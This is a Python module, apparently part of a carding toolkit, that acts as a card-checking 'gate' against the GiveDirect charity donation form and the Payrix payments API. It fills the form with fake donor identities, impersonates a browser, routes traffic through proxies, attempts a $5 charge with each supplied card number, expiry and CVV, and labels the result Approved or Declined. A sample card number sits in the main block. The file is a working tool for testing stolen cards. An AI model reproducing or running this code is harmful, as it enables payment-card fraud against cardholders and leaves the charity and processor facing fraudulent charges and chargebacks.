# Pure gate motor for 'payrix' — Payrix / GiveDirect (donate.givedirect.org) gateway.
# Source: new_gates/payrix.py

import random
import uuid

from curl_cffi import requests as rq
from faker import Faker

_GATEWAY = 'Payrix GiveDirect (Charity)'

_f = Faker('en_US')
_email = lambda: f"{_f.user_name()}@{random.choice(['hotmail.com', 'gmail.com', 'yahoo.com', 'outlook.com'])}"
_name = lambda: (_f.first_name().replace(' ', '').replace('.', ''), _f.last_name().replace(' ', '').replace('.', ''))
_phone = lambda: ''.join(random.choices('0123456789', k=10))
_zip = lambda: f"{random.randint(0, 99999):05d}"


def _between(html, start, end):
    try:
        star = html.index(start) + len(start)
        end = html.index(end, star)
        return html[star:end]
    except ValueError:
        return 'None'


_TIMEOUT = 30


def _flow(num, mes, ano, cvv, proxy=None):
    with rq.Session(impersonate='edge') as session:
        try:
            if proxy:
                session.proxies = {'http': proxy, 'https': proxy}
            mes = mes.zfill(2)
            ano = ano[-2:] if len(ano) == 4 else ano
            date = f'{mes}{ano}'
            fn, ln = _name()
            headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 7; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36',
                       'Accept-Language': 'es-MX,es;q=0.6', 'Sec-Fetch-Site': 'none', 'Sec-Fetch-Mode': 'navigate',
                       'Sec-Fetch-User': '?1', 'Sec-Fetch-Dest': 'document',
                       'sec-ch-ua': '"Chromium";v="136", "Brave";v="136", "Not.A/Brand";v="99"',
                       'Accept': 'application/json'}
            res = session.get('https://donate.givedirect.org/?cid=480', headers=headers, timeout=_TIMEOUT,
                              cookies={'__cf_bm': 'd.NsvkN4gbyvv6iBzLiL8inKcsmqlNauHT4XmiqZ3vs-1734336007-1.0.1.1-AnCy6aEVfpvD3SdEbAyFvcPvNAnISobLsa4ysbpRuzeQuTm1GUha9Qfo6z_cqPiwRgqBRD1.W90EK38_3hkyZA'})
            csrf = _between(res.text, 'type="hidden" name="csrf_token" value="', '"')
            appid = _between(res.text, 'type="hidden" id="app_id" value="', '"')
            res = session.get('https://donate.givedirect.org/generateSessionKey.php', headers=headers, timeout=_TIMEOUT)
            token = res.json().get('mid') if '{' in res.text else 'p1_mer_6690221c22faa66a692af20'
            tn = res.json().get('key')
            headers['Content-Type'] = 'application/x-www-form-urlencoded; charset=UTF-8'
            headers['Referer'] = 'https://api.payrix.com/payFields/?section=main'
            headers['TXNSESSIONKEY'] = tn
            data = f'payment[number]={num}&payment[expiration]={date}&payment[cvv]={cvv}&customer[merchant]={token}&customer[first]={fn}&customer[last]={ln}&origin=8&tmxSessionId={uuid.uuid4()}'
            res = session.post('https://api.payrix.com/tokens', headers=headers, data=data, allow_redirects=False, timeout=_TIMEOUT)
            token_data = res.json().get('response', {}).get('data', [{}])[0]
            cust = token_data.get('customer', {}).get('id', '')
            ccT = token_data.get('id', '')
            tk = token_data.get('token', '')
            br = _between(res.text, 'payment":{"number":"', '"')
            form_data = {
                'formData[0][name]': 'csrf_token', 'formData[0][value]': csrf,
                'formData[1][name]': 'cc_fee', 'formData[1][value]': '0.15',
                'formData[2][name]': 'charity_fee', 'formData[2][value]': '0.05',
                'formData[3][name]': 'feeAmount', 'formData[3][value]': '0.50',
                'formData[4][name]': 'payment_method', 'formData[4][value]': 'Card',
                'formData[5][name]': 'frequency', 'formData[5][value]': 'One+Time',
                'formData[6][name]': 'selected-frequency', 'formData[6][value]': 'One+Time',
                'formData[7][name]': 'amount', 'formData[7][value]': '5.00',
                'formData[8][name]': 'fee_amount', 'formData[8][value]': '',
                'formData[9][name]': 'cover_fee_required', 'formData[9][value]': '0',
                'formData[10][name]': 'user', 'formData[10][value]': '',
                'formData[11][name]': 'pass', 'formData[11][value]': '',
                'formData[12][name]': 'employer_name', 'formData[12][value]': '',
                'formData[13][name]': 'employee_email', 'formData[13][value]': '',
                'formData[14][name]': 'tribute_name', 'formData[14][value]': '',
                'formData[15][name]': 'tribute_notifyname', 'formData[15][value]': '',
                'formData[16][name]': 'tribute_email', 'formData[16][value]': '',
                'formData[17][name]': 'tribute_address', 'formData[17][value]': '',
                'formData[18][name]': 'tribute_city', 'formData[18][value]': '',
                'formData[19][name]': 'tribute_zip', 'formData[19][value]': '',
                'formData[20][name]': 'tribute_occasion', 'formData[20][value]': '',
                'formData[21][name]': 'includeamount_flag', 'formData[21][value]': '0',
                'formData[22][name]': 'salutation', 'formData[22][value]': 'Mr.',
                'formData[23][name]': 'firstname', 'formData[23][value]': fn,
                'formData[24][name]': 'lastname', 'formData[24][value]': ln,
                'formData[25][name]': 'email', 'formData[25][value]': _email(),
                'formData[26][name]': 'phone', 'formData[26][value]': _phone(),
                'formData[27][name]': 'phone_type', 'formData[27][value]': 'Mobile',
                'formData[28][name]': 'company', 'formData[28][value]': '',
                'formData[29][name]': 'country', 'formData[29][value]': 'USA',
                'formData[30][name]': 'add1', 'formData[30][value]': f'{random.randint(1, 200)}th. Grovee',
                'formData[31][name]': 'add2', 'formData[31][value]': '',
                'formData[32][name]': 'city', 'formData[32][value]': 'manhattan',
                'formData[33][name]': 'statelist', 'formData[33][value]': 'NY',
                'formData[34][name]': 'state', 'formData[34][value]': 'NY',
                'formData[35][name]': 'zip', 'formData[35][value]': _zip(),
                'formData[36][name]': 'comments', 'formData[36][value]': '',
                'formData[37][name]': 'cczip', 'formData[37][value]': _zip(),
                'formData[38][name]': 'account_type', 'formData[38][value]': '8',
                'formData[39][name]': 'routing', 'formData[39][value]': '',
                'formData[40][name]': 'account', 'formData[40][value]': '',
                'formData[41][name]': 'daf_name', 'formData[41][value]': '',
                'formData[42][name]': 'daf_url', 'formData[42][value]': '',
                'formData[43][name]': 'form_id', 'formData[43][value]': '480',
                'formData[44][name]': 'charity_id', 'formData[44][value]': '22',
                'formData[45][name]': 'ein', 'formData[45][value]': '',
                'formData[46][name]': 'form_type', 'formData[46][value]': 'Donation',
                'formData[47][name]': 'totalAmount', 'formData[47][value]': '5',
                'formData[48][name]': 'paymentMethod', 'formData[48][value]': 'Card',
                'formData[49][name]': 'additionalData', 'formData[49][value]': '480,+One+Time',
                'formData[50][name]': 'token', 'formData[50][value]': tk,
                'formData[51][name]': 'tokenId', 'formData[51][value]': ccT,
                'formData[52][name]': 'ccard', 'formData[52][value]': br,
                'formData[53][name]': 'customer', 'formData[53][value]': cust,
                'appId': appid, 'isAjax': 'true',
            }
            res = session.post('https://donate.givedirect.org/processPayment.php', headers=headers, data=form_data, allow_redirects=False, timeout=_TIMEOUT)
            if 'Insufficient funds' in res.text:
                return {'status': True, 'success': False, 'response': 'Declined ❌ | Insufficient funds'}
            if 'Declined' in res.text:
                try:
                    msg = res.json().get('db') or 'No message'
                except Exception:
                    msg = res.text[:80] or 'No message'
                return {'status': True, 'success': False, 'response': f'Declined ❌ | {msg}'}
            try:
                success = res.json().get('success')
            except Exception:
                success = None
            if success:
                return {'status': True, 'success': True, 'response': 'Approved ✅ | $5 charged success'}
            return {'status': True, 'success': False, 'response': f'Declined ❌ | {(res.text or "").strip()[:80] or "Gateway no response"}'}
        except Exception as e:
            return {'status': False, 'raise': str(e)[:200]}


def _checker(cc, bin_data, proxy=None):
    try:
        return _flow(cc[0], cc[1], cc[2], cc[3], proxy=proxy)
    except Exception as e:
        return {'status': False, 'raise': str(e)[:200]}


def run_check(cc, bin_data, ctx=None):
    ctx = ctx or {}
    proxy = (ctx.get('proxy') or '').strip()
    r = _checker(cc, bin_data, proxy=proxy)
    if not r.get('status'):
        return {'status': 'Error ⚠️', 'response': r.get('raise', 'Gate error')}
    return {'status': 'Approved ✅' if r.get('success') else 'Declined ❌', 'response': r.get('response', '')}


if __name__ == '__main__':
    print(run_check(['5579209155651117', '11', '2030', '241'], ''))